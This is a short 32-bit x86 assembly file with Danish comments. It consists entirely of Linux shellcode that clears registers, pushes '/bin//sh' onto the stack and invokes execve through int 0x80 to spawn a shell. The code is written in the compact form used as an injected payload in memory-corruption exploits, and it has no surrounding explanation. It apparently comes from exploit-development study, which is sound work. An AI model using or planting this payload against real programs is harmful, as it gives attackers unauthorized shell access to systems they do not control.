[BITS 32]

    ; Clear eax, ecx, edx
    xor ecx, ecx
    imul ecx

    ; Push strengen
    push eax
    push `//sh`
    push `/bin`

    ; Kald styresystemet
    mov al, 11
    mov ebx, esp
    int 0x80
